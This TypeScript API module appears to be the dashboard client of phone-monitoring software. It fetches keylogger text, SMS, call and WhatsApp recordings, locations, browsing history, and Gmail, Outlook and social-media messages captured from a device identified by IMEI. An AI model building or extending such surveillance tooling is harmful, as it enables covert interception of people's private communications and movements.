import { baseApi } from "./baseApi";

// ------------------ Shared Types ------------------
export type EntityString =
  | "call_history"
  | "ip_address"
  | "contacts"
  | "sms"
  | "call_recordings"
  | "voip_recordings"
  | "applications"
  | "internet_history"
  | "locations"
  | "whatsapp"
  | "instagram"
  | "telegram"
  | "linkedin"
  | "botim"
  | "snapchat"
  | "whatsapp_business"
  | "facebook_messenger"
  | "youtube"
  | "keylogger"
  | "outlook"
  | "gmail";

// Delete
export interface DeleteArgs {
  email: string;
  deviceImei: string;
  entity: EntityString;
  ids?: number[];
  clearAll?: boolean;
};

type Pagination = {
  page: number;
  limit: number;
  total: number;
  totalPages: number;
  hasNext: boolean;
  nextPage: number | null;
};


//-----------gmail-----------
export interface GmailData {
  id: number;
  userId: number | null;
  token: string;
  entity: string;
  direction: string;
  name: string;
  number: string;
  text: string;
  timestamp: string;  
  createdAt: string;
  updatedAt: string;
}
export interface GmailResponse {
  message: string;
  data: GmailData[];
  pagination?: Pagination | null;
}

//--------outlook----------
export interface OutlookData {
  id: number;
  userId: number | null;
  token: string;
  entity: string;
  direction: string;  
  name: string;
  number: string;
  text: string;
  timestamp: string;  
  createdAt: string;
  updatedAt: string;
}
export interface OutlookResponse {
  message: string;
  data: OutlookData[];
  pagination?: Pagination | null;
}

// Call History
export interface CallHistory {
  id: string;
  userId: string;
  token: string;
  entity: string;
  direction: string;
  name: string;
  number: string;
  duration: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
  starred: boolean;
  type: string;
  cellid: string;
  LAC: string;
}
export interface CallHistoryResponse {
  message: string;
  data: CallHistory[];
  pagination: Pagination;
}

export type CallHistoryResult = {
  data: CallHistory[];
  pagination: Pagination;
};

// Youtube
export interface Youtube {
  id: string;
  userId: string;
  token: string;
  entity: string;
  text: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface YoutubeResponse {
  message: string;
  data: Youtube[];
  pagination: Pagination;
}

export type YoutubeResult = {
  data: Youtube[];
  pagination: Pagination;
}

// Key Logger 
export interface KeyLogger {
  id: string;
  userId: string;
  token: string;
  entity: string;
  text: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface KeyLoggerResponse {
  message: string;
  data: KeyLogger[];
  textData: any[];
  pagination: Pagination;
}


// IP Address
export interface IPAddress {
  id: string;
  userId: string;
  token: string;
  entity: string;
  text: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface IPAdressResponse {
  message: string;
  data: IPAddress[];
  pagination: Pagination;
}

export type IPAddressResult = {
  data: IPAddress[];
  pagination: Pagination;
}

// Contacts
export interface ContactNumbers {
  id: string;
  userId: string;
  token: string;
  entity: string;
  name: string;
  number: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface ContactResponse {
  message: string;
  contacts: any[];
  pagination: Pagination;
}

export type ContactsResult = {
  contacts: ContactNumbers[];
  pagination: Pagination;
};

// SMS
export interface SMSData {
  id: number;
  userId: number | null;
  token: string;
  entity: string;
  direction: string;
  name: string;
  number: string;
  text: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface SMSResponse {
  message: string;
  data: SMSData[];
  pagination: Pagination;
}

export type SmsResult = {
  data: SMSData[];
  pagination: Pagination
}

//--------Shared---------
export interface FileRow {
  id: number;
  entity: "call_recordings" | "voip_recordings" | string;
  name: string;
  size: string;
  timestamp: string;
  storage: "s3-encrypted" | string;
  s3_key: string;
  isEncrypted: boolean;
  viewUrl: string;
}

// Call Recordings (joined)
export interface CallRecordingMeta {
  id: number;
  token: string;
  entity: "call_recordings" | string;
  name: string;
  number: string;
  duration: string;
  size: string;
  extension: string;
  attachment: string; // s3_key
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}

export interface JoinedRecording {
  id: number;
  name: string;
  number: string;
  duration: string;
  size: string;
  extension: string;
  timestamp: string;
  audioUrl: string | null;
  streamId?: number;
  s3Key?: string;
}

interface GetDataResponse {
  message: string;
  data: CallRecordingMeta[];
  pagination?: Pagination;
}

export type JoinedRecordingResult = {
  data: JoinedRecording[];
  pagination?: Pagination;
};

interface FileDataResponse {
  success: boolean;
  count: number;
  files: FileRow[];
}

//----- WhatsApp / VoIP Recordings-----
export interface VoipRecordingMeta {
  id: number;
  feature: "whatsapp" | "whatsapp_business" | string;
  direction: "incoming" | "outgoing" | string;
  name: string;
  duration: string;
  size: string;
  extension: string;
  attachment: string;
  timestamp: string;
  entity?: "voip_recordings" | string;
}

export interface JoinedVoipRecording {
  id: number;
  name: string;
  number: string | null;
  duration: string;
  size: string;
  extension: string;
  timestamp: string;
  audioUrl: string | null;
  streamId?: number;
  s3Key?: string;
  direction?: string;
  feature?: string;
}

export interface WhatsappRecordingResponse {
  message: string;
  data: VoipRecordingMeta[];
}

export type WhatsappRecordingResult = {
  data: JoinedVoipRecording[];
  pagination?: Pagination;
};

// Applications
export interface Application {
  id: number;
  label: string;
  version: string;
  action: string;
  timestamp: string;
}
export interface ApplicationResponse {
  message: string;
  data: Application[];
}

// Internet History
export interface InternetHistory {
  id: number;
  userId: string;
  token: string;
  entity: string;
  title: string;
  url: string;
  timestamp: string;
  createdAt: string;
  updatedAt: string;
}
export interface InternetHistoryResponse {
  message: string;
  data: InternetHistory[];
}

// ------------------ Helpers (mapping) ------------------
const mapCall = (call: any): CallHistory => ({
  id: String(call.id),
  userId: call.userId || "",
  token: call.token || "",
  entity: call.entity || "call_history",
  name: call.name || "Unknown",
  number: call.number || "",
  duration: call.duration || "00:00:00",
  timestamp: call.timestamp,
  createdAt: call.createdAt || call.timestamp,
  updatedAt: call.updatedAt || call.timestamp,
  direction: call.direction,
  starred: false,
  type: (call.direction as "incoming" | "outgoing") ?? "incoming",
  cellid: call.cellid || "-",
  LAC: call.lac || "-",
});

//------------Location-------------
export interface RawLocation {
  id: number | string;
  latitude: number | string;
  longitude: number | string;
  address?: string;
  provider?: string;
  timestamp: string;
}


interface GetLocationsResponse {
  message: string;
  data: RawLocation[];
  pagination: Pagination;
}

// Universal interface for any social entity
export interface SocialData {
  id: string;
  userId?: string;
  token: string;
  entity: string;
  direction?: string;
  name: string;
  number?: string;
  text?: string;
  timestamp: string;
  createdAt?: string;
  updatedAt?: string;
  // Escape hatch for any extra fields
  [key: string]: any;
}

export interface SocialResponse {
  message?: string;
  data?: SocialData[];
  textData?: any[];
  [key: string]: any;
}

export type SocialResult = {
  data: SocialData[];
  textData: any[];
  pagination?: Pagination;
};

const tagForEntity = (entity: EntityString) => {
  switch (entity) {
    case "call_history":
      return "Calls";
    case "sms":
      return "SMS";
    case "contacts":
      return "Contacts";
    case "call_recordings":
      return "CallRecordings";
    case "voip_recordings":
      return "VoipRecordings";
    case "applications":
      return "Applications";
    case "internet_history":
      return "InternetHistory";
    case "ip_address":
      return "IPAddress";
    case "youtube":
    return "Youtube";
    case "keylogger":
      return "KeyLogger";
      case "gmail":
      return "Gmail";
      case "outlook":
      return "Outlook";
    default:
      return "Dashboard";
  }
};

// ------------------ RTK Query Slice ------------------
export const featuresApi = baseApi.injectEndpoints({
  endpoints: (build) => ({
    // -------- Delete (mutation) --------
    deleteData: build.mutation<void, DeleteArgs>({
      query: ({ email, deviceImei, entity, ids, clearAll }) => ({
        url: "/user/delete-data",
        method: "POST",
        data: {
          email,
          deviceImei,
          entity,
          ...(clearAll ? { clearAll: true } : {}),
          ...(Array.isArray(ids) && ids.length ? { ids } : {}),
        },
      }),
      invalidatesTags: (_res, _err, arg) => [
        { type: tagForEntity(arg.entity) as any, id: "LIST" },
      ],
    }),

      //-------------gmail-----------
        getGmail: build.query<
        { gmail: GmailData[],pagination?: Pagination | null},
          { email: string; deviceImei: string , page?: number; limit?: number }
        >({
          query: ({ email, deviceImei, page = 1, limit = 10 }) => ({
            url: "/user/get-data",
            method: "POST",
            data: { email, entity: "gmail", deviceImei, page, limit },
          }),
          transformResponse: (
            res: GmailResponse & { pagination?: Pagination | null }) =>
            {
              const list = (res?.data ?? []).sort(
              (a, b) =>
                new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
            );
            return {gmail:list, pagination: res.pagination ?? null};
          },
          providesTags: (result) =>
            result
              ? [{ type: "Gmail", id: "LIST" }]
              : [{ type: "Gmail", id: "LIST" }],
          keepUnusedDataFor: 300,
        }),
        
    
      //-------------outlook------------
         getOutlook: build.query<
        { outlook: OutlookData[],pagination?: Pagination | null},
          { email: string; deviceImei: string , page?: number; limit?: number }
        >({
          query: ({ email, deviceImei, page = 1, limit = 10 }) => ({
            url: "/user/get-data",
            method: "POST",
            data: { email, entity: "outlook", deviceImei, page, limit },
          }),
          transformResponse: (
            res: OutlookResponse & { pagination?: Pagination | null }) =>
            {
              const list = (res?.data ?? []).sort(
              (a, b) =>
                new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
            );
            return {outlook:list, pagination: res.pagination ?? null};
          },
          providesTags: (result) =>
            result
              ? [{ type: "Outlook", id: "LIST" }]
              : [{ type: "Outlook", id: "LIST" }],
          keepUnusedDataFor: 300,
        }),

    // -------- Call History --------
    getCallHistory: build.query<
      CallHistoryResult,
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "call_history", deviceImei, page, limit },
      }),
    
      transformResponse: (res: CallHistoryResponse): CallHistoryResult => {
        return {
          data: (res?.data ?? []).map(mapCall),
          pagination: res.pagination,
        };
      },
    
      providesTags: (result) =>
        result?.data
          ? [
              { type: "Calls", id: "LIST" },
              ...result.data.map((r) => ({
                type: "Calls" as const,
                id: r.id,
              })),
            ]
          : [{ type: "Calls", id: "LIST" }],
    
      keepUnusedDataFor: 300,
    }),
    

    // -------- IP Address --------
    getIpAddresses: build.query<
      IPAddressResult,
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "ip_address", deviceImei, page, limit },
      }),
      transformResponse: (res: IPAdressResponse): IPAddressResult => {
        return {
          data: (res?.data ?? []),
          pagination: res.pagination,
        };
      },

      providesTags: (result) =>
        result
          ? [{ type: "IPAddress", id: "LIST" }]
          : [{ type: "IPAddress", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    // -------- Contacts --------
    getContacts: build.query<
      ContactsResult,
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/contacts",
        method: "POST",
        data: { email, entity: "contacts", deviceImei, page, limit },
      }),

      transformResponse: (res: ContactResponse): ContactsResult => {
        const contacts = (res?.contacts ?? []).map((contact: any) => ({
          id: String(contact.id),
          userId: String(contact.userId ?? ""),
          token: String(contact.token ?? ""),
          entity: String(contact.entity ?? "contacts"),
          name: String(contact.name ?? ""),
          number: String(contact.number ?? ""),
          timestamp: String(contact.timestamp ?? ""),
          createdAt: String(contact.createdAt ?? contact.timestamp ?? ""),
          updatedAt: String(contact.updatedAt ?? contact.timestamp ?? ""),
        }));

        return {
          contacts,
          pagination: res.pagination,  
        };
      },

      providesTags: () => [{ type: "Contacts", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    // ------------ SMS -----------
    getSms: build.query<
    SmsResult,
     { email: string; deviceImei: string, page?:number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "sms", deviceImei, page, limit },
      }),
      transformResponse: (res: SMSResponse): SmsResult => {
        return {
            data: res?.data ?? [],
            pagination: res.pagination,
        }
      },

      providesTags: (result) =>
        result ? [{ type: "SMS", id: "LIST" }] : [{ type: "SMS", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    // -------- Call Recordings (joined with file-data) --------
    getCallRecordingsJoined: build.query<
    JoinedRecordingResult,
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      // Use queryFn so we can run two requests and join results
      async queryFn(arg, _api, _extraOptions, baseQuery) {
        const page = arg.page ?? 1;
        const limit = arg.limit ?? 10;
      
        // 1) meta page
        const metaRes = await baseQuery({
          url: "/user/get-data",
          method: "POST",
          data: {
            email: arg.email,
            entity: "call_recordings",
            deviceImei: arg.deviceImei,
            page,
            limit,
          },
        });
        if (metaRes.error) return { error: metaRes.error };
      
        // 2) files (can stay non-paginated; join using keys)
        const filesRes = await baseQuery({
          url: "/file/file-data",
          method: "POST",
          data: { email: arg.email, deviceImei: arg.deviceImei },
        });
        if (filesRes.error) return { error: filesRes.error };
      
        const metaJson = metaRes.data as GetDataResponse;
        const fileJson = filesRes.data as FileDataResponse;
      
        const onlyRecordings = (fileJson.files ?? []).filter(
          (f) => f.entity === "call_recordings"
        );
      
        const byS3Key = new Map<string, FileRow>();
        for (const f of onlyRecordings) byS3Key.set(f.s3_key, f);
      
        const joined: JoinedRecording[] = (metaJson.data ?? []).map((m) => {
          const file = byS3Key.get(m.attachment);
          return {
            id: m.id,
            name: m.name,
            number: m.number,
            duration: m.duration,
            size: m.size,
            extension: m.extension,
            timestamp: m.timestamp,
            audioUrl: file?.viewUrl ?? null,
            streamId: file?.id,
            s3Key: file?.s3_key,
          };
        });
    
        return {
          data: {
            data: joined,
            pagination: metaJson.pagination,
          },
        };
      },
      providesTags: (result) =>
        result
          ? [
              { type: "CallRecordings", id: "LIST" },
              ...(result.data ?? []).map((r: JoinedRecording) => ({
                type: "CallRecordings" as const,
                id: r.id,
              })),
            ]
          : [{ type: "CallRecordings", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),


// -------- WhatsApp / VoIP Call Recordings (JOINED with file-data) --------
getVoipRecordingsJoined: build.query<
  WhatsappRecordingResult,
  { email: string; deviceImei: string; page?: number; limit?: number }
>({
  async queryFn(arg, _api, _extra, baseQuery) {
    const page = arg.page ?? 1;
    const limit = arg.limit ?? 10;

    // 1) Meta (paginated)
    const metaRes = await baseQuery({
      url: "/user/get-data",
      method: "POST",
      data: {
        email: arg.email,
        entity: "voip_recordings",
        deviceImei: arg.deviceImei,
        page,
        limit,
      },
    });
    if (metaRes.error) return { error: metaRes.error };

    // 2) File rows
    const filesRes = await baseQuery({
      url: "/file/file-data",
      method: "POST",
      data: { email: arg.email, deviceImei: arg.deviceImei },
    });
    if (filesRes.error) return { error: filesRes.error };

    const metaJson = metaRes.data as (WhatsappRecordingResponse & {
      pagination?: Pagination;
    });
    const fileJson = filesRes.data as FileDataResponse;

    const onlyVoip = (fileJson.files ?? []).filter(
      (f) => f.entity === "voip_recordings"
    );

    const byS3Key = new Map<string, FileRow>();
    for (const f of onlyVoip) {
      if (f?.s3_key) byS3Key.set(f.s3_key, f);
    }

    const joined: JoinedVoipRecording[] = (metaJson.data ?? []).map((m) => {
      const file = m.attachment ? byS3Key.get(m.attachment) : undefined;

      const number = (m as any).number ?? null; // don’t guess from name
      const audioUrl = file?.viewUrl ?? null;

      return {
        id: m.id,
        name: m.name,
        number,
        duration: m.duration,
        size: m.size,
        extension: m.extension,
        timestamp: m.timestamp,
        audioUrl,
        streamId: file?.id,
        s3Key: file?.s3_key,
        direction: (m as any).direction,
        feature: (m as any).feature,
      };
    });

    // ⚠️ Keep this sort ONLY if backend is not sorting.
    // Ideally backend already returns latest-first for stable pagination.
    joined.sort(
      (a, b) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
    );

    return {
      data: {
        data: joined,
        pagination: metaJson.pagination,
      },
    };
  },

  providesTags: (result) =>
    result
      ? [
          { type: "VoipRecordings", id: "LIST" },
          ...result.data.map((r) => ({
            type: "VoipRecordings" as const,
            id: r.id,
          })),
        ]
      : [{ type: "VoipRecordings", id: "LIST" }],

  keepUnusedDataFor: 300,
}),

    // -------- Applications --------
    getApplications: build.query<
      Application[],
      { email: string; deviceImei: string }
    >({
      query: ({ email, deviceImei }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "applications", deviceImei },
      }),
      transformResponse: (res: ApplicationResponse) => res?.data ?? [],
      providesTags: (result) =>
        result
          ? [{ type: "Applications", id: "LIST" }]
          : [{ type: "Applications", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    // -------- Internet History --------
    getInternetHistory: build.query<
      InternetHistory[],
      { email: string; deviceImei: string }
    >({
      query: ({ email, deviceImei }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "internet_history", deviceImei },
      }),
      transformResponse: (res: InternetHistoryResponse) => res?.data ?? [],
      providesTags: (result) =>
        result
          ? [{ type: "InternetHistory", id: "LIST" }]
          : [{ type: "InternetHistory", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    //-------------location---------------
    getLocations: build.query<
      { locationData: RawLocation[]; pagination: Pagination },
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "locations", deviceImei, page, limit },
      }),

      transformResponse: (res: GetLocationsResponse) => ({
        locationData: res?.data ?? [],
        pagination: res?.pagination,
      }),

      providesTags: (result) =>
        result
          ? [
              { type: "Locations", id: "LIST" },
              ...result.locationData.map((r) => ({
                type: "Locations" as const,
                id: String(r.id),
              })),
            ]
          : [{ type: "Locations", id: "LIST" }],

      keepUnusedDataFor: 300,
    }),

    //-------------Social Media----------------
    getSocialData: build.query<
    SocialResult,
    { email: string; deviceImei: string; entity: string; }
  >({
    query: ({ email, deviceImei, entity }) => ({
      url: "/user/get-data",
      method: "POST",
      data: { email, entity, deviceImei },
    }),
    transformResponse: (res: SocialResponse): SocialResult => ({
      data: Array.isArray(res?.data) ? res.data : [],
      textData: Array.isArray(res?.textData) ? res.textData : [],
      pagination: res?.pagination,
    }),
    providesTags: (result, _err, arg) =>
      result
        ? [
            ...result.data.map((row) => ({
              type: "Social" as const,
              id: `${arg.entity}-${row.id}`,
            })),
            { type: "Social" as const, id: `LIST-${arg.entity}` },
          ]
        : [{ type: "Social" as const, id: `LIST-${arg.entity}` }],
    keepUnusedDataFor: 300,
  }),
  

    //-----------Youtube--------------
    getYoutube: build.query<
      YoutubeResult,
      { email: string; deviceImei: string, page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 20 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "youtube", deviceImei, page, limit },
      }),
      transformResponse: (res: YoutubeResponse): YoutubeResult => {
        return {
          data: (res?.data ?? []),
          pagination: res.pagination
        }
      },
      providesTags: (result) =>
        result
          ? [{ type: "Youtube", id: "LIST" }]
          : [{ type: "Youtube", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),

    //--------------KeyLogger-------------
    getKeyLogger: build.query<
      { keylogger: KeyLogger[]; pagination?: Pagination | null },
      { email: string; deviceImei: string; page?: number; limit?: number }
    >({
      query: ({ email, deviceImei, page = 1, limit = 10 }) => ({
        url: "/user/get-data",
        method: "POST",
        data: { email, entity: "keylogger", deviceImei, page, limit },
      }),
      transformResponse: (
        res: KeyLoggerResponse & { pagination?: Pagination | null }
      ) => {
        const list = (res?.data ?? []).sort(
          (a, b) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        return { keylogger: list, pagination: res.pagination ?? null };
      },
      providesTags: (result) =>
        result
          ? [{ type: "Keylogger", id: "LIST" }]
          : [{ type: "Keylogger", id: "LIST" }],
      keepUnusedDataFor: 300,
    }),
  }),
  overrideExisting: false,
});

    

// ------------------ Hooks ------------------
export const {
  useDeleteDataMutation,

  useGetSocialDataQuery,
  useLazyGetSocialDataQuery,

  useGetLocationsQuery,

  useGetCallHistoryQuery,
  useLazyGetCallHistoryQuery,

  useGetYoutubeQuery,
  useLazyGetYoutubeQuery,

  useGetKeyLoggerQuery,
  useLazyGetKeyLoggerQuery,

  useGetIpAddressesQuery,
  useLazyGetIpAddressesQuery,

  useGetContactsQuery,
  useLazyGetContactsQuery,
  useGetGmailQuery,
  useLazyGetGmailQuery,

  useGetOutlookQuery,
  useLazyGetOutlookQuery,

  useGetSmsQuery,
  useLazyGetSmsQuery,

  useGetCallRecordingsJoinedQuery,
  useLazyGetCallRecordingsJoinedQuery,

  useGetVoipRecordingsJoinedQuery,
  useLazyGetVoipRecordingsJoinedQuery,

  useGetApplicationsQuery,
  useLazyGetApplicationsQuery,

  useGetInternetHistoryQuery,
  useLazyGetInternetHistoryQuery,
} = featuresApi;
